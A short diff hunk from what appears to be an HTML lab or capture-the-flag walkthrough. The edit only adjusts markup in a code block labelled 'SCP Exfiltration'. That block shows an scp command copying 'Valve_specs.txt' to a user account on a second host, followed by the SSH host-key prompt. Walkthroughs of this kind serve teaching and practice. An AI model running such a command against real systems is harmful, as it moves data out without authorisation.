@@ -230,7 +230,7 @@ it is accessable and in fact what we are looking for.<br>
 ## 11.SECURE COPY PROTOCOL
 
 <pre data-label="SCP Exfiltration"><code>
-<span class="orange"><strong>bash-5.2$ scp Valve_specs.txt square@192.168.1.16:~/BUREAU.02/
+<span class="orange"><strong>bash-5.2$</strong></span>  scp Valve_specs.txt square@192.168.1.16:~/BUREAU.02/
 The authenticity of host '192.168.1.16 (192.168.1.16)' can't be established.
 ED25519 key fingerprint is SHA256:4km0uXkh784O7Fc9TGf4Yc8rC2+2ZmvxXSkYLMD8w/Y.
 This key is not known by any other names.
